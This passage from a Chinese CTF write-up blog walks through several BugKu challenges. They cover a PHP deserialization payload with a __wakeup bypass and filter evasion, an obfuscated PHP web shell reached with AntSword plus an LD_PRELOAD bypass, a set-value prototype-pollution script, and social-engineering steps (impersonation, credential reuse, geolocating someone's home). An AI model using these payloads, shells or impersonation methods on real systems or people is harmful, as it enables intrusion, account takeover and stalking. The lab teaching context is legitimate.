class="string">&quot;/cat|more|tail|less|head|curl|nc|strings|sort|echo/i&quot;</span>, <span class="keyword">$this</span>-&gt;cmd))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;&lt;/br&gt;flag能让你这么容易拿到吗？&lt;br&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="comment">// echo &quot;&lt;br&gt;right!&lt;br&gt;&quot;;</span></span><br><span class="line">            $a = `<span class="keyword">$this</span>-&gt;cmd`;</span><br><span class="line">            var_dump($a);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;给你个安慰奖吧，hhh！&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    $select = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    $res=unserialize(@$select);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>题型是反序列化，首先需要get传参code<br>
我们先了解一下常见的php魔术方法：</p>
<blockquote>
<p>__construct() 创建对象时调用<br>
__destruct() 销毁对象时调用<br>
__toString() 当一个对象被当作一个字符串使用<br>
__sleep() 在对象在被序列化之前运行<br>
__wakeup 将在序列化之后立即被调用</p>
</blockquote>
<p>访问控制修饰符：</p>
<blockquote>
<p>public(公有)<br>
protected(受保护)<br>
private(私有的)<br>
protected属性被序列化的时候属性值会变成：%00*%00属性名<br>
private属性被序列化的时候属性值会变成：%00类名%00属性名</p>
</blockquote>
<p>分析源码<br>
首先初始化ctf类的时候会创建两个变量，username和cmd，满足username=admin的时候就会输出cmd的类型与值<br>
所以我们构建如下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $username = <span class="string">&#x27;hack&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> $cmd = <span class="string">&#x27;NULL&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$username,$cmd</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = $cmd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/cat|more|tail|less|head|curl|nc|strings|sort|echo/i&quot;</span>, <span class="keyword">$this</span>-&gt;cmd))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;&lt;/br&gt;flag能让你这么容易拿到吗？&lt;br&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// echo &quot;&lt;br&gt;right!&lt;br&gt;&quot;;</span></span><br><span class="line">            $a = `<span class="keyword">$this</span>-&gt;cmd`;</span><br><span class="line">            var_dump($a);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;给你个安慰奖吧，hhh！&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> ctf(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($obj);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行后得到：<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E5%AE%89%E6%85%B0%E5%A5%96/1%40O68EH%60IO%7D%252WRXFXJ4%29%29L.png" alt=""><br>
即O:3:“ctf”:2:{s:11:&quot; * username&quot;;s:5:“admin”;s:6:&quot; * cmd&quot;;s:2:“ls”;}<br>
<strong>注意</strong>：<br>
我们需要绕过_wakeup()，就得把2写成3，当代表变量个数的数字大于实际真实值时就会绕过这个函数，否则username变量会被覆盖成guest，而不是admin。<br>
还有一点，就是前文提到的，protected属性被序列化的时候属性值会变成：%00*%00属性名<br>
所以payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;O:3:&quot;ctf&quot;:3:&#123;s:11:&quot;%00*%00username&quot;;s:5:&quot;admin&quot;;s:6:&quot;%00*%00cmd&quot;;s:2:&quot;ls&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E5%AE%89%E6%85%B0%E5%A5%96/RMGXZVYRXISXL9%60J981BXV4.png" alt=""><br>
可以看见有flag.php文件，我们再cat读取一下，因为这里过滤了cat，所以我们改成ca\t flag.php<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E5%AE%89%E6%85%B0%E5%A5%96/9DY%28%7B74VIOO~Z2%24DMDYJU4T.png" alt=""><br>
在源码里找到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E5%AE%89%E6%85%B0%E5%A5%96/O6%24T%60B%7BV6%24%5D2FR2%60%7D4%5D%7B_U9.png" alt=""><br>
当然也可以使用tac命令<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E5%AE%89%E6%85%B0%E5%A5%96/O%25ARZ%5D4%40653A5%28L5A9%5BJGR7.png" alt=""></p>
<h3 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h3>
<p>打开，看到一堆被混淆过后的php源码😤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">&#x27;pfkzYUelxEGmVcdDNLTjXCSIgMBKOuHAFyRtaboqwJiQWvsZrPhn&#x27;</span>, <span class="keyword">__FILE__</span>);</span><br><span class="line">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ = urldecode(<span class="string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);</span><br><span class="line">$BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC = $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">3</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">6</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">33</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">30</span>&#125;;</span><br><span class="line">$hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ = $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">33</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">10</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">24</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">10</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">24</span>&#125;;</span><br><span class="line">$vNwTOsKPEAlLciJDBhWtRSHXempIrjyQUuGoaknYCdFzqZMxfbgV = $hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ&#123;<span class="number">0</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">18</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">3</span>&#125; . $hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ&#123;<span class="number">0</span>&#125; . $hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ&#123;<span class="number">1</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">24</span>&#125;;</span><br><span class="line">$ciMfTXpPoJHzZBxLOvngjQCbdIGkYlVNSumFrAUeWasKyEtwhDqR = $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">7</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">13</span>&#125;;</span><br><span class="line">$BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC.= $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">22</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">36</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">29</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">26</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">30</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">32</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">35</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">26</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">30</span>&#125;;</span><br><span class="line"><span class="keyword">eval</span>($BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC(<span class="string">&quot;&quot;</span>)); <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>解php混淆可参考一下这篇文章</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.52pojie.cn&#x2F;thread-1074918-1-1.html</span><br></pre></td></tr></table></figure>
<p>解出后，得到一段php代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">@<span class="keyword">eval</span>($_POST[ymlisisisiook]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>用蚁剑进行连接<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/getshell/QQ%E6%88%AA%E5%9B%BE20210102234659.png" alt=""><br>
连接成功后，发现只能访问html下的文件，无法访问其他地方<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/getshell/QQ%E6%88%AA%E5%9B%BE20210102234746.png" alt=""><br>
使用蚁剑的插件查看<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/getshell/%401_G8RIP%40LEN%60S1BS~_392H.png" alt=""><br>
发现putenv没有被禁用，果断采取LD_PRELOAD方法绕过😋<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/getshell/6GH~0V%7D84%29B%7DA%24CIRIA_HG7.png" alt=""><br>
生成文件之后，再连接我们生成的那个文件<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/getshell/WWVHCE%24U9%7B63MW%60I5LGAU%60I.png" alt=""><br>
连接后，可以突破限制访问其他地方<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/getshell/%7BN83F_52HH4~9ZTQB%2543%5DYW.png" alt=""><br>
flag在根目录下获得😀<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/getshell/%28KDTXR%40KF5NY%7D%5DX8U2ZKGIJ.png" alt=""></p>
<h3 id="社工-伪造"><a class="header-anchor" href="#社工-伪造">¶</a>社工-伪造</h3>
<p>首先题目是社工类，提示信息伪造<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5%E4%BC%AA%E9%80%A0/D9%28M%29DCU%5BND%24VKY%7D~U%5DUGQ3.png" alt=""><br>
开启环境<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5%E4%BC%AA%E9%80%A0/%7D%60U08%60%29FL%24A%24Z48%7D1F~%2526L.png" alt=""><br>
这里输入我的qq小号进入<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5%E4%BC%AA%E9%80%A0/%60_A04M1D%5DKDB%606W6A%25%7D%40F6O.png" alt=""><br>
对话之后，小美告诉我们她只告诉她的男朋友flag，我们去她的空间看看<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5%E4%BC%AA%E9%80%A0/C~%5D%5D~Z5XHO6X%406PILOH75%7DF.png" alt=""><br>
这里有张她和她男朋友的聊天的截图<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5%E4%BC%AA%E9%80%A0/S10114-20264579.jpg" alt=""><br>
结合题目提示，我们把qq名字和头像都换成她男朋友的<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5%E4%BC%AA%E9%80%A0/FOGG2UKMK%40%241YY%7BW%60Q%5D8CZT.png" alt=""><br>
再进行一次登录，向小美要flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5%E4%BC%AA%E9%80%A0/2T5SNT_G%7D2E0%2967AX0N%5BQ%7D9.png" alt=""><br>
成功获取flag</p>
<h3 id="web40"><a class="header-anchor" href="#web40">¶</a>web40</h3>
<p>打开环境<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/web40/MJGP%28LDT%5BFU%40%7DTU%25KDU%24N%5B6.png" alt=""><br>
这里flag解码后是一个假的flag😡<br>
但仔细再看，源码提示我们tig，tig是git的文本界面，可充当各种git命令的输出传呼机<br>
说明可能这里存在git泄露，我们用dirsearch扫描验证一下<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/web40/DI%29GWU0NU6TV%7DABKK1HZ~%5DY.png" alt=""><br>
确实存在git泄露，那直接拿extract冲它<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/web40/Q6C%28FA07~NI8%25GR9%7D1CS%29~C.png" alt=""><br>
在输出的文件夹中看到一堆文本文件，在其中一个文件中找到正确的flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/web40/VE%5B8C5BG5W%5B%40XA%7DR9_7%2887S.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;git_is_good_distributed_version_control_system&#125;</span><br></pre></td></tr></table></figure>
<h3 id="sodirty"><a class="header-anchor" href="#sodirty">¶</a>sodirty</h3>
<p>打开网站，没找到什么有用的信息<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/sodirty/%40T%5DLG05HHJJG3T%5BRLO6JWAQ.png" alt=""><br>
扫描了一下，发现存在一个www.zip<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/sodirty/QGIHVV%29TLR_4AM%25%5BNCO%7D%298O.png" alt=""><br>
访问后下载压缩包，解压后，打开index.js得到源码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> setFn = <span class="built_in">require</span>(<span class="string">&#x27;set-value&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Admin = &#123;</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:process.env.password?process.env.password:<span class="string">&quot;password&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&quot;/getflag&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.password === <span class="literal">undefined</span> || req.body.password === req.session.challenger.password)&#123;</span><br><span class="line">        res.send(<span class="string">&quot;登录失败&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(req.session.challenger.age &gt; <span class="number">79</span>)&#123;</span><br><span class="line">            res.send(<span class="string">&quot;糟老头子坏滴很&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> key = req.body.key.toString();</span><br><span class="line">        <span class="keyword">let</span> password = req.body.password.toString();</span><br><span class="line">        <span class="keyword">if</span>(Admin[key] === password)&#123;</span><br><span class="line">            res.send(process.env.flag ? process.env.flag : <span class="string">&quot;flag&#123;test&#125;&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            res.send(<span class="string">&quot;密码错误，请使用管理员用户名登录.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line">router.get(<span class="string">&#x27;/reg&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    req.session.challenger = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;user&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;pass&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span>: <span class="number">80</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.send(<span class="string">&quot;用户创建成功!&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    res.redirect(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">router.get(<span class="string">&#x27;/index&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    res.send(<span class="string">&#x27;&lt;title&gt;BUGKU-登录&lt;/title&gt;&lt;h1&gt;前端被炒了&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;a href=&quot;./reg&quot;&gt;注册&lt;/a&gt;&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">router.post(<span class="string">&quot;/update&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(req.session.challenger === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/reg&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (req.body.attrkey === <span class="literal">undefined</span> || req.body.attrval === <span class="literal">undefined</span>) &#123;</span><br><span class="line">            res.send(<span class="string">&quot;传参有误&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> key = req.body.attrkey.toString();</span><br><span class="line">            <span class="keyword">let</span> value = req.body.attrval.toString();</span><br><span class="line">            setFn(req.session.challenger, key, value);</span><br><span class="line">            res.send(<span class="string">&quot;修改成功&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure>
<p>发现set-value，存在原型链污染，poc地址：<code>https://snyk.io/vuln/SNYK-JS-SETVALUE-450213</code><br>
<strong>poc:</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> setFn = <span class="built_in">require</span>(<span class="string">&#x27;set-value&#x27;</span>);</span><br><span class="line">setFn(&#123;&#125;,<span class="string">&#x27;__proto__.p1&#x27;</span>,<span class="string">&quot;hacked&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(&#123;&#125;.p1);</span><br></pre></td></tr></table></figure>
<p>观察源码</p>
<blockquote>
<p>1.发现路由&quot;/reg&quot;会创建一个challenger用户字典<br>
2.发现路由&quot;/update&quot;可以对challenger传参键值对（attrkey和attrval），对challenger字典中进行修改<br>
3.路由&quot;/getflag&quot;可以获取到flag，但存在几个验证，首先需要传参两个参数（key和password）进来，并且对用户字典中的年龄进行判断，大于79会失败；其次Admin[key]需要等于password，而body.password是多少我们是不知道的</p>
</blockquote>
<p>既然知道是原型链污染了，我们直接利用poc自定义一个password即可，而对于年龄，他是已经存在的变量，那我们就直接覆盖age变量<br>
写一个脚本进行相对应的发送请求：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Author：dota_st</span></span><br><span class="line"><span class="comment"># Date：2021/2/5 8:36</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://114.67.246.176:11468&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span> &#125;</span><br><span class="line">req = requests.session()</span><br><span class="line">test = req.get(url+<span class="string">&quot;/reg&quot;</span>)</span><br><span class="line">print(test.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = req.post(url+<span class="string">&quot;/update&quot;</span>,json=&#123;<span class="string">&quot;attrkey&quot;</span>:<span class="string">&quot;__proto__.pwd22&quot;</span>,<span class="string">&quot;attrval&quot;</span>:<span class="string">&quot;pwd&quot;</span>&#125;,headers=headers)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = req.post(url+<span class="string">&quot;/update&quot;</span>,json=&#123;<span class="string">&quot;attrkey&quot;</span>:<span class="string">&quot;age&quot;</span>,<span class="string">&quot;attrval&quot;</span>:<span class="number">10</span>&#125;,headers=headers)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line">r = req.post(url+<span class="string">&quot;/getflag&quot;</span>,json=&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;pwd22&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;pwd&quot;</span>&#125;,headers=headers)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
<p>运行后得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/sodirty/LVKM00%7B%25M01%5B%40S~WPQLWU%7B2.png" alt=""></p>
<h3 id="社工-初步收集"><a class="header-anchor" href="#社工-初步收集">¶</a>社工-初步收集</h3>
<p>首先打开环境，在网站找到一个下载链接，开始下载文件<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/KB%28S%60ML%28BU%7BR%4092OQPJVRA7.png" alt=""><br>
得到一个exe文件，开始尝试发送一下<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/HW%40C~PFGC%5D%286AVT%7B~T%29K~%5DG.png" alt=""><br>
提示会收集信息，可能存在通信，我们使用ida进行查看<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/QZ%25G7T%40VNRO%7BAUA8%24M4Z_RI.png" alt=""><br>
发现关键信息，这里有账号和密码，还看到一个smtp协议，猜测这个密码是授权码，需要通过smtp进行登录，很多师傅都卡在了这一步，因为他们都是直接去163邮箱的官网页面登录，导致其一直登录失败。正确的做法是找一个邮件客户端或者Telnet进行登录。<br>
这里我使用了Foxmail进行登录，配置如下所示，其他客户端可能有所不同，但大同小异<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/FP%28CSNJ%60F%5DEX%25FB%7DN%7DJTOFR.png" alt=""><br>
登录成功后，发现有邮件主人和bugku管理员的通信内容，提取关键信息，我用红色标注了<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/7%5DB_%7B%40%25YW24%28INI_4A%5DM%60%405.png" alt=""><br>
看到邮件主人id是<strong>mara</strong>，发送的邮件日期为2021年2月8日，并且是前两天刚过了生日，而且还有一句“都二十的人了”关键语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">总结提取信息：</span><br><span class="line">主人：mara</span><br><span class="line">生日：20010206</span><br></pre></td></tr></table></figure>
<p>直接拿id和生日去尝试后台登录，发现用户名就是mara，密码是生日<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/075X%24_FK43RK80PFENV63XP.png" alt=""><br>
登录成功后，翻了一下就得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5-%E5%88%9D%E6%AD%A5%E6%94%B6%E9%9B%86/VBM58Q%28%40%5DN%24%60PM%25%60QVTBHXD.png" alt=""></p>
<h3 id="社工-进阶收集"><a class="header-anchor" href="#社工-进阶收集">¶</a>社工-进阶收集</h3>
<p>开局一张图<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5-%E8%BF%9B%E9%98%B6%E6%94%B6%E9%9B%86/qq.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">通过图片提取信息：</span><br><span class="line">1.地点在大雁塔</span><br><span class="line">2.小美从家里出发经过了7站，并且出发的站点是地铁初始站</span><br><span class="line">3.小美家离初始站有800米左右，离第六站有1000米以上左右</span><br></pre></td></tr></table></figure>
<p>查找了大雁塔附近地铁站，发现有一班地铁可以到达大雁塔，并且初始站离大雁塔有7站<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%96%B0bugku/%E7%A4%BE%E5%B7%A5-%E8%BF%9B%E9%98%B6%E6%94%B6%E9%9B%86/C%5DCN~859%29EZ6T5SV%29Q%40%25%40IH.png" alt=""><br>
也就是小美家离航天城有1000多米，离韦曲南有800米左右，两个地点画圆找交点即可，综合得到小美家小区名字是兰乔国际城</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;lanqiaoguojicheng&#125;</span><br></pre></td></tr></table></figure>
<h3 id="No-one-knows-regex-better-than-me"><a class="header-anchor" href="#No-one-knows-regex-better-than-me">¶</a>No one knows regex better than me</h3>
